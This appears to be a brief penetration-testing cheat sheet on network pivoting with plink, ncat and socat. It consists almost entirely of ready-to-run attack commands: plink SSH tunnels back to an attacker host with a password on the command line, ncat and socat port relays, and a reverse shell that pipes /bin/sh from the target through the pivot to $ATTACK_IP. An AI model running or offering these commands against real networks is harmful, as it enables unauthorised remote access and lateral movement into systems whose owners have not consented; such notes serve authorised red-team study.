# Plink, Netcat & Socat Pivoting

## Plink (Windows SSH Tunneling)
```cmd
# On Windows pivot host
plink.exe -ssh -R 8000:127.0.0.1:80 user@$ATTACK_IP -pw password
plink.exe -ssh -D 1080 user@$ATTACK_IP -pw password
```

## Netcat Pivoting
```bash
# Port forwarding with ncat
ncat -lvp 4444 -c "ncat $TARGET_IP 445"

# Bind shell through pivot
ncat -lvp 8080 -c "ncat 10.0.0.100 80"
```

## Socat Pivoting
```bash
# Port forward on pivot
socat TCP4-LISTEN:8080,fork TCP4:10.0.0.100:80

# Reverse shell through pivot (on pivot)
socat TCP4-LISTEN:4444,fork TCP4:$ATTACK_IP:4444

# On target
nc $PIVOT_IP 4444 -e /bin/sh
```
